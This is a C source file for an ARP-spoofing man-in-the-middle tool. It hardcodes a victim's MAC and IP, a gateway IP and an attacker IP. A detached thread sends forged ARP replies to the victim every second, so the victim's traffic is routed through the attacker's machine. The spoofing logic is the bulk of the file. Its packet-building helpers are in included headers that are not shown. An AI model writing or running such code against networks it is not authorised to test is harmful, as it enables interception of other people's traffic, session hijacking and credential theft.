#include<unistd.h>
#include<pthread.h>
#include <sys/socket.h>
#include"arp.h"
#include"sniffer.h"
#include"getif.h"

typedef enum{
	false =0,
	true =1
}bool;

bool debug=false;
void usage(){
	printf("MITM usage:\n"
		"  -h = show this help test\n"
		"  -d = increase debugging verbosity\n");
}
void* arp_spoof(void* info){
	MITM_info* m_info= (MITM_info*)info;
	if(debug){
		printf("======start arp spoof======\n");
		printf("dev is %s\n",m_info->dev);
		print_ip(m_info->TARGET_IP);
	}
	int p_tag_target;
       	p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,
			m_info->TARGET_MAC,m_info->GATEWAY_IP,m_info->TARGET_IP,0);
	if(p_tag_target == -1){
		if(debug)printf("======arp spoof fail,return======\n");
		return NULL;
	}
	 while(1){
		p_tag_target=send_fake_ARP(m_info->dev,m_info->ATTACKER_MAC,m_info->TARGET_MAC,
				 m_info->GATEWAY_IP,m_info->TARGET_IP,p_tag_target);
		if(p_tag_target == -1)break;
		usleep(1000000);
	}
	printf("======arp spoof fail,return======\n");
	return NULL;
}

int main(int argc,char* argv[]){
	int c ,exitcode;
	u_char ATTACKER_MAC[6];
	u_char TARGET_MAC[6]={0xd0,0xc5,0xd3,0x26,0x36,0x77};
	u_char GATEWAY_MAC[6];
	u_char ATTACKER_IP[4]={192,168,43,46};
	u_char TARGET_IP[4]={192,168,43,127};
	u_char GATEWAY_IP[4]={192,168,43,1};
	char errbuf[PCAP_ERRBUF_SIZE];
	char* dev;

	for(;;){
		c=getopt(argc, argv,"hd");
		if(c < 0)break;
		switch(c){
			case 'h':
				usage();
				goto out;
			break;
			case 'd':
				debug=true;
			break;
			default:
		       		usage();
				goto out;	
		}
	}

	pthread_t t;
	//the thread of arp_spoof need to be detached or joinable?
	pthread_attr_t a;
	pthread_attr_init(&a);
	pthread_attr_setdetachstate(&a,PTHREAD_CREATE_DETACHED);
	
	dev = pcap_lookupdev(errbuf);
	if(!dev){
		printf("%s\n",errbuf);
		return 1;
	}else{
		if(debug)printf("dev is %s\n",dev);
	}
	getAttackerMAC(dev,ATTACKER_MAC);
	print_mac(ATTACKER_MAC);

        MITM_info info={
                .TARGET_MAC=TARGET_MAC,
                .ATTACKER_MAC=ATTACKER_MAC,
                .GATEWAY_MAC=GATEWAY_MAC,
                .TARGET_IP=TARGET_IP,
                .GATEWAY_IP=GATEWAY_IP,
        };
        strcpy(info.dev,dev);
	/* init fake arp and the return value should be the next input to send_fake_arp op */
	pthread_create(&t,NULL,arp_spoof,&info);
	pthread_join(t,NULL);
	
	return 0;

out :
	return exitcode;
}
